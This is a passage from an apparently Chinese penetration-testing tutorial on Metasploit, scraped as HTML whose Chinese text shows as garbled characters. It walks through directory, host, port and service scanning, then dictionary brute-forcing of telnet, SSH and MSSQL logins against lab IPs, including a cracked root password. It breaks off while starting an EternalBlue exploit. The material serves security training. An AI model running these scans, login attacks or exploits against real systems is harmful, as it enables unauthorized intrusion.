class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h3 id="å®æˆ˜EXï¼šä½¿ç”¨MSF-dir-scanner-å‘ç°æ•æ„Ÿç›®å½•"><a href="#å®æˆ˜EXï¼šä½¿ç”¨MSF-dir-scanner-å‘ç°æ•æ„Ÿç›®å½•" class="headerlink" title="å®æˆ˜EXï¼šä½¿ç”¨MSF dir_scanner å‘ç°æ•æ„Ÿç›®å½•"></a>å®æˆ˜EXï¼šä½¿ç”¨MSF dir_scanner å‘ç°æ•æ„Ÿç›®å½•</h3><p>ï¼ˆç›®æ ‡ 2008 <a href="http://192.168.33.4/cms/">http://192.168.33.4/cms/</a></p><p> 1ã€use ç›¸åº”çš„æ¨¡å—</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">&gt;</span> use auxiliary/scanner/http/dir_scanner msf6 auxiliary<span class="token punctuation">(</span>**scanner/http/dir_scanner**<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2ã€info æŸ¥çœ‹æ¨¡å—è¯¦ç»†ä¿¡æ¯ </p><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2021-07-22%20%E4%B8%8B%E5%8D%889.13.17.png" style="zoom:75%;"><p>3ã€æ‰«æCMS</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 auxiliary<span class="token punctuation">(</span>**scanner/http/dir_scanner**<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.33.4RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.33.4msf6 auxiliary<span class="token punctuation">(</span>**scanner/http/dir_scanner**<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> path /cmspath <span class="token operator">=</span><span class="token operator">&gt;</span> /cmsmsf6 auxiliary<span class="token punctuation">(</span>**scanner/http/dir_scanner**<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> ThREADS <span class="token number">100</span>ThREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">100</span>msf6 auxiliary<span class="token punctuation">(</span>**scanner/http/dir_scanner**<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RPORT <span class="token number">80</span>RPORT <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">80</span>msf6 auxiliary<span class="token punctuation">(</span>**scanner/http/dir_scanner**<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“æœï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Detecting error code<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using code <span class="token string">'404'</span> as not found <span class="token keyword">for</span> <span class="token number">192.168</span>.33.4<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found http://192.168.33.4:80/cms/<span class="token punctuation">..</span>./ <span class="token number">403</span> <span class="token punctuation">(</span><span class="token number">192.168</span>.33.4<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found http://192.168.33.4:80/cms/Admin/ <span class="token number">302</span> <span class="token punctuation">(</span><span class="token number">192.168</span>.33.4<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found http://192.168.33.4:80/cms/admin/ <span class="token number">302</span> <span class="token punctuation">(</span><span class="token number">192.168</span>.33.4<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found http://192.168.33.4:80/cms/images/ <span class="token number">200</span> <span class="token punctuation">(</span><span class="token number">192.168</span>.33.4<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found http://192.168.33.4:80/cms/include/ <span class="token number">200</span> <span class="token punctuation">(</span><span class="token number">192.168</span>.33.4<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="5-3-2-ä¸»æœºå‘ç°ï¼ˆé€Ÿåº¦ä¸å¦‚Nmapï¼‰"><a href="#5-3-2-ä¸»æœºå‘ç°ï¼ˆé€Ÿåº¦ä¸å¦‚Nmapï¼‰" class="headerlink" title="5.3.2 ä¸»æœºå‘ç°ï¼ˆé€Ÿåº¦ä¸å¦‚Nmapï¼‰"></a>5.3.2 ä¸»æœºå‘ç°ï¼ˆé€Ÿåº¦ä¸å¦‚Nmapï¼‰</h3><p>Metasploit ä¸­æä¾›äº†ä¸€äº›è¾…åŠ©æ¨¡å—å¯ç”¨äºä¸»æœºå‘ç°ï¼Œè¿™äº›æ¨¡å—ä½äºmodules/auxiliary/scanner/discovery/ ç›®å½•ä¸­ã€‚</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxiliary/scanner/discovery/arp_sweepauxiliary/scanner/discovery/empty_udpauxiliary/scanner/discovery/ipv6_multicast_pingauxiliary/scanner/discovery/ipv6_neighborauxiliary/scanner/discovery/ipv6_neighbor_router_advertisementauxiliary/scanner/discovery/udp_probeauxiliary/scanner/discovery/udp_sweep<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥ä½¿ç”¨arp_sweep æ¥æšä¸¾æœ¬åœ°å±€åŸŸç½‘ä¸­çš„æ‰€æœ‰æ´»è·ƒä¸»æœºã€‚ï¼ˆé€Ÿåº¦æ…¢ï¼‰</p><pre class="line-numbers language-ba" data-language="ba"><code class="language-ba">msf5 &gt; use auxiliary/scanner/discovery/arp_sweep msf5 auxiliary(scanner/discovery/arp_sweep) &gt; set RHOSTS 172.16.132.160/24RHOSTS =&gt; 172.16.132.160/24msf5 auxiliary(scanner/discovery/arp_sweep) &gt; set THREADS 50THREADS =&gt; 50msf5 auxiliary(scanner/discovery/arp_sweep) &gt; exploit <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2014.09.20.png" style="zoom:40%;"><h3 id="5-3-3-ç«¯å£æ‰«æï¼ˆå®æµ‹æ•ˆç‡ä¸å¦‚nmapï¼‰"><a href="#5-3-3-ç«¯å£æ‰«æï¼ˆå®æµ‹æ•ˆç‡ä¸å¦‚nmapï¼‰" class="headerlink" title="5.3.3 ç«¯å£æ‰«æï¼ˆå®æµ‹æ•ˆç‡ä¸å¦‚nmapï¼‰"></a>5.3.3 ç«¯å£æ‰«æï¼ˆå®æµ‹æ•ˆç‡ä¸å¦‚nmapï¼‰</h3><p>Metasploit çš„è¾…åŠ©æ¨¡å—ä¸­æä¾›äº†å‡ æ¬¾å®ç”¨çš„ç«¯å£æ‰«æå™¨ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxiliary/scanner/portscan/ackauxiliary/scanner/portscan/synauxiliary/scanner/portscan/xmasauxiliary/scanner/portscan/ftpbounceauxiliary/scanner/portscan/tcp    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€èˆ¬æƒ…å†µä¸‹æ¨èä½¿ç”¨syn ç«¯å£æ‰«æå™¨ï¼Œå› ä¸ºä»–çš„æ‰«æé€Ÿåº¦è¾ƒå¿«ï¼Œç»“æœæ¯”è¾ƒå‡†ç¡®ä¸”ä¸æ˜“è¢«å¯¹æ–¹å¯Ÿè§‰ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/portscan/synmsf5 auxiliary<span class="token punctuation">(</span>scanner/portscan/syn<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.16</span>.132.138RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">172.16</span>.132.138msf5 auxiliary<span class="token punctuation">(</span>scanner/portscan/syn<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/portscan/syn<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2014.14.00.png" style="zoom:40%;"><h3 id="5-3-4-æ¢æµ‹æœåŠ¡è¯¦ç»†ä¿¡æ¯"><a href="#5-3-4-æ¢æµ‹æœåŠ¡è¯¦ç»†ä¿¡æ¯" class="headerlink" title="5.3.4 æ¢æµ‹æœåŠ¡è¯¦ç»†ä¿¡æ¯"></a>5.3.4 æ¢æµ‹æœåŠ¡è¯¦ç»†ä¿¡æ¯</h3><p>åœ¨Metasploit ä¸­æœ‰ä¸€äº›æ’ä»¶å¯ä»¥è°ƒç”¨ç³»ç»Ÿä¸­çš„å‘½ä»¤ï¼Œæ¯”å¦‚å¯ä»¥ä½¿ç”¨Nmap æ¢æµ‹ç›®æ ‡çš„è¯¦ç»†æœåŠ¡ä¿¡æ¯ï¼Œå‘½ä»¤</p><p>   [nmap -sS -Pn 192.168.1.1 -sV]ï¼Œå‚æ•°è¯´æ˜ï¼š</p><blockquote><p>-sS ä½¿ç”¨SYN åŠè¿æ¥æ‰«æ</p><p>-Pn åœ¨æ‰«æä¹‹å‰ï¼Œä¸å‘é€ICME echo è¯·æ±‚æµ‹è¯•ç›®æ ‡æ˜¯å¦æ´»è·ƒ</p><p>-sV æ¢æµ‹æœåŠ¡è¯¦ç»†ç‰ˆæœ¬</p></blockquote> <img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2014.15.12.png" alt="åœ¨msfä¸­ä½¿ç”¨nmapç¤ºä¾‹" style="zoom:57%;"><h3 id="5-3-5-æœåŠ¡æŸ¥ç‚¹"><a href="#5-3-5-æœåŠ¡æŸ¥ç‚¹" class="headerlink" title="5.3.5 æœåŠ¡æŸ¥ç‚¹"></a>5.3.5 æœåŠ¡æŸ¥ç‚¹</h3><p>åœ¨Metasploit çš„è¾…åŠ©æ¨¡å—ä¸­ï¼Œæœ‰å¾ˆå¤šç”¨äºæœåŠ¡æ‰«æå’ŒæŸ¥ç‚¹çš„å·¥å…·ï¼Œè¿™äº›å·¥å…·é€šå¸¸ä»¥[service_name]_version å‘½åã€‚è¯¥æ¨¡å—å¯ç”¨äºéå†ç½‘ç»œä¸­åŒ…å«æŸç§æœåŠ¡çš„ä¸»æœºï¼Œå¹¶è¿›ä¸€æ­¥ç¡®å®šæœåŠ¡çš„ç‰ˆæœ¬ã€‚</p><h4 id="1ï¼‰telnet-æœåŠ¡æŸ¥ç‚¹"><a href="#1ï¼‰telnet-æœåŠ¡æŸ¥ç‚¹" class="headerlink" title="1ï¼‰telnet æœåŠ¡æŸ¥ç‚¹"></a>1ï¼‰telnet æœåŠ¡æŸ¥ç‚¹</h4><p>  Telnet æ˜¯ä¸€ä¸ªå†å²æ‚ ä¹…ä½†å…ˆå¤©ç¼ºä¹å®‰å…¨æ€§çš„ç½‘ç»œæœåŠ¡ã€‚ç”±äºTelnet æ²¡æœ‰å¯¹ä¼ è¾“çš„æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œè¶Šæ¥è¶Šå¤šçš„ç®¡ç†å‘˜æ¸æ¸ä½¿ç”¨æ›´ä¸ºå®‰å…¨çš„SSH åè®®ä»£æ›¿å®ƒã€‚å°½ç®¡å¦‚æ­¤ï¼Œå¾ˆå¤šä»·æ ¼æ˜‚è´µã€ä½¿ç”¨å¯¿å‘½æ›´é•¿çš„å¤§å‹äº¤æ¢æœºä½¿ç”¨Telnet åè®®çš„å¯èƒ½æ€§æ›´å¤§ï¼Œè€Œæ­¤ç±»äº¤æ¢æœºåœ¨ç½‘ç»œä¸­çš„ä½ç½®ä¸€èˆ¬æ¥è¯´éƒ½éå¸¸é‡è¦ã€‚å¯ä»¥ä½¿ç”¨telnet_version æ¨¡å—æ‰«æä¸€ä¸‹æ˜¯å¦æœ‰ä¸»æœºæˆ–è®¾å¤‡å¼€å¯äº†Tenlnet æœåŠ¡ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/telnet/telnet_version msf5 auxiliary<span class="token punctuation">(</span>scanner/telnet/telnet_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.16</span>.132.160/24RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">172.16</span>.132.160/24msf5 auxiliary<span class="token punctuation">(</span>scanner/telnet/telnet_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/telnet/telnet_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2ï¼‰sshæœåŠ¡æŸ¥ç‚¹"><a href="#2ï¼‰sshæœåŠ¡æŸ¥ç‚¹" class="headerlink" title="2ï¼‰sshæœåŠ¡æŸ¥ç‚¹"></a>2ï¼‰sshæœåŠ¡æŸ¥ç‚¹</h4><p>é€šå¸¸ç®¡ç†å‘˜ä¼šä½¿ç”¨SSH å¯¹æœåŠ¡å™¨è¿›è¡Œè¿œç¨‹ç®¡ç†ï¼ŒæœåŠ¡å™¨ä¼šå‘SSH å®¢æˆ·ç«¯è¿”å›ä¸€ä¸ªè¿œç¨‹Shell è¿æ¥ã€‚å¦‚æœæ²¡æœ‰åšå…¶ä»–çš„å®‰å…¨å¢å¼ºé…ç½®ï¼Œåªè¦è·å–æœåŠ¡çš„ç™»å½•å£ä»¤ï¼Œå°±å¯ä»¥ä½¿ç”¨SSH å®¢æˆ·ç«¯ç™»å½•æœåŠ¡å™¨ï¼Œé‚£å°±ç›¸å½“äºè·å–äº†å“åº”ç™»å½•ç”¨æˆ·çš„æ‰€æœ‰æƒé™ã€‚å¯ä»¥ä½¿ç”¨ssh_version æ¨¡å—éå†ç½‘ç»œä¸­å¼€å¯SSH æœåŠ¡çš„ä¸»æœºã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/ssh/ssh_version msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.16</span>.132.160/24RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">172.16</span>.132.160/24msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h3 id="å®æˆ˜EXï¼šä½¿ç”¨MSF-ssh-version-SSHæœåŠ¡æŸ¥ç‚¹å¹¶çˆ†ç ´"><a href="#å®æˆ˜EXï¼šä½¿ç”¨MSF-ssh-version-SSHæœåŠ¡æŸ¥ç‚¹å¹¶çˆ†ç ´" class="headerlink" title="å®æˆ˜EXï¼šä½¿ç”¨MSF ssh_version SSHæœåŠ¡æŸ¥ç‚¹å¹¶çˆ†ç ´"></a>å®æˆ˜EXï¼šä½¿ç”¨MSF ssh_version SSHæœåŠ¡æŸ¥ç‚¹å¹¶çˆ†ç ´</h3><p>192.168.33.0/24</p><p> 1ã€use ç›¸åº”çš„æ¨¡å—</p><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2021-07-22%20%E4%B8%8B%E5%8D%887.39.03.png" style="zoom:75%;"><p>2ã€info æŸ¥çœ‹æ¨¡å—è¯¦ç»†ä¿¡æ¯</p><p>3ã€æ‰«æ</p><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2021-07-22%20%E4%B8%8B%E5%8D%888.45.30.png" style="zoom:75%;"><p> 4ã€å‡†å¤‡å­—å…¸çˆ†ç ´</p><p>use auxiliary/scanner/ssh/ssh_login</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.33.6RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.33.6msf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> VERBOSE <span class="token boolean">true</span>VERBOSE <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token boolean">true</span>msf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> PASS_fILE /root/Desktop/msf/ssh-pass.dicPASS_fILE <span class="token operator">=</span><span class="token operator">&gt;</span> /root/Desktop/msf/ssh-pass.dicmsf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> USER_fILE /root/Desktop/msf/ssh-user.dicUSER_fILE <span class="token operator">=</span><span class="token operator">&gt;</span> /root/Desktop/msf/ssh-user.dicmsf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2014.19.42.png" style="zoom:50%;"><p>5ã€ç»“æœ</p><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2021-07-22%20%E4%B8%8B%E5%8D%889.10.16.png" style="zoom:75%;"><p>root 123.com</p></blockquote><h4 id="3ï¼‰mssqlæœåŠ¡æŸ¥ç‚¹"><a href="#3ï¼‰mssqlæœåŠ¡æŸ¥ç‚¹" class="headerlink" title="3ï¼‰mssqlæœåŠ¡æŸ¥ç‚¹"></a>3ï¼‰mssqlæœåŠ¡æŸ¥ç‚¹</h4><p>å¯ä»¥ä½¿ç”¨mysql_ping æŸ¥æ‰¾ç½‘ç»œæ¨¡å—ä¸­çš„Microsoft SQL Serverã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/mssql/mssql_ping msf5 auxiliary<span class="token punctuation">(</span>scanner/mssql/mssql_ping<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.16</span>.132.160/24backRHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">172.16</span>.132.160/24msf5 auxiliary<span class="token punctuation">(</span>scanner/mssql/mssql_ping<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/mssql/mssql_ping<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-4-å£ä»¤çŒœæµ‹"><a href="#5-4-å£ä»¤çŒœæµ‹" class="headerlink" title="5.4 å£ä»¤çŒœæµ‹"></a>5.4 å£ä»¤çŒœæµ‹</h2><h3 id="5-4-1-telnetå£ä»¤çŒœæµ‹"><a href="#5-4-1-telnetå£ä»¤çŒœæµ‹" class="headerlink" title="5.4.1 telnetå£ä»¤çŒœæµ‹"></a>5.4.1 telnetå£ä»¤çŒœæµ‹</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/telnet/telnet_login msf5 auxiliary<span class="token punctuation">(</span>scanner/telnet/telnet_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.16</span>.132.138RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">172.16</span>.132.138msf5 auxiliary<span class="token punctuation">(</span>scanner/telnet/telnet_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> USER_FILE /root/dic/user.dicUSER_FILE <span class="token operator">=</span><span class="token operator">&gt;</span> /root/dic/user.dicmsf5 auxiliary<span class="token punctuation">(</span>scanner/telnet/telnet_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> PASS_FILE /root/dic/pwd.dicPASS_FILE <span class="token operator">=</span><span class="token operator">&gt;</span> /root/dic/pwd.dicmsf5 auxiliary<span class="token punctuation">(</span>scanner/telnet/telnet_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/telnet/telnet_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-4-2-sshå£ä»¤çŒœæµ‹"><a href="#5-4-2-sshå£ä»¤çŒœæµ‹" class="headerlink" title="5.4.2 sshå£ä»¤çŒœæµ‹"></a>5.4.2 sshå£ä»¤çŒœæµ‹</h3><p>åœ¨ç¡®å®šäº†ç½‘ç»œä¸Šçš„SSH æœåŠ¡ä¹‹åï¼Œå¯ä»¥ä½¿ç”¨MSF ä¸­çš„ssh_login æ¨¡å—å¯¹SSH æœåŠ¡è¿›è¡Œå£ä»¤çŒœæµ‹æ”»å‡»ï¼Œåœ¨è¿›è¡Œå£ä»¤æ”»å‡»ä¹‹å‰ï¼Œéœ€è¦ä¸€ä¸ªå¥½ç”¨çš„ç”¨æˆ·åå’Œå£ä»¤å­—å…¸ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/ssh/ssh_loginmsf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.16</span>.132.160RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">172.16</span>.132.160msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> USER_FILE /root/dic/user.dicUSER_FILE <span class="token operator">=</span><span class="token operator">&gt;</span> /root/dic/user.dicmsf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> PASS_FILE /root/dic/pwd.dicPASS_FILE <span class="token operator">=</span><span class="token operator">&gt;</span> /root/dic/pwd.dicmsf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-4-3-mssqlå£ä»¤çŒœæµ‹"><a href="#5-4-3-mssqlå£ä»¤çŒœæµ‹" class="headerlink" title="5.4.3 mssqlå£ä»¤çŒœæµ‹"></a>5.4.3 mssqlå£ä»¤çŒœæµ‹</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/mssql/mssql_login msf5 auxiliary<span class="token punctuation">(</span>scanner/mssql/mssql_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.16</span>.132.135RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">172.16</span>.132.135msf5 auxiliary<span class="token punctuation">(</span>scanner/mssql/mssql_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> USER_FILE /root/dic/user.dicUSER_FILE <span class="token operator">=</span><span class="token operator">&gt;</span> /root/dic/user.dicmsf5 auxiliary<span class="token punctuation">(</span>scanner/mssql/mssql_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> PASS_FILE /root/dic/pwd.dicPASS_FILE <span class="token operator">=</span><span class="token operator">&gt;</span> /root/dic/pwd.dicmsf5 auxiliary<span class="token punctuation">(</span>scanner/mssql/mssql_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/mssql/mssql_login<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-5-ç½‘ç»œæœåŠ¡æ¸—é€æ”»å‡»"><a href="#5-5-ç½‘ç»œæœåŠ¡æ¸—é€æ”»å‡»" class="headerlink" title="5.5 ç½‘ç»œæœåŠ¡æ¸—é€æ”»å‡»"></a>5.5 ç½‘ç»œæœåŠ¡æ¸—é€æ”»å‡»</h2><h3 id="5-5-1-æ°¸æ’ä¹‹è“"><a href="#5-5-1-æ°¸æ’ä¹‹è“" class="headerlink" title="5.5.1 æ°¸æ’ä¹‹è“"></a>5.5.1 æ°¸æ’ä¹‹è“</h3><h4 id="1ï¼‰æ¼æ´æ‰«æ"><a href="#1ï¼‰æ¼æ´æ‰«æ" class="headerlink" title="1ï¼‰æ¼æ´æ‰«æ"></a>1ï¼‰æ¼æ´æ‰«æ</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">---------------msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/smb/smb_ms17_010msf5 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.1.200/24RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.1.200/24msf5 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2ï¼‰æ”»å‡»"><a href="#2ï¼‰æ”»å‡»" class="headerlink" title="2ï¼‰æ”»å‡»"></a>2ï¼‰æ”»å‡»</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">------------------msf5 <span class="token operator">&gt;</span> use exploit/windows/smb/ms17_010_eternalbluemsf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload 